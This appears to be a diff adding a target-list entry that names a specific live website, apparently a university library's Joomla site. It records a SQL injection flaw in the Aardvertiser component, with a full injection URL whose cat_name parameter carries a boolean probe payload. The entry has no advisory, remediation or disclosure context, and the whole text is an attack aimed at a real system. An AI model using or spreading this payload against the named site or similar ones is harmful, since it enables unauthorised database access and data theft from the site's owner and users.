@@ -1,0 +1,8 @@
+#******************************************************************************************#
+Target : http://micampus.csf.itesm.mx/biblioteca/index.php/component/content/
+	Vulnerability  - Component: Joomla Component Aardvertiser SQL Injection
+	Vulnerability URL 	: http://micampus.csf.itesm.mx/biblioteca/index.php/component/content//index.php?option=com_aardvertiser&cat_name=Vehicles'+AND+'1'='1&task=view
+	Vulnerability Details 	: /index.php?option=com_aardvertiser&cat_name=Vehicles'+AND+'1'='1&task=view
+
+#-------------------------------------------------------------------------------------------#
+
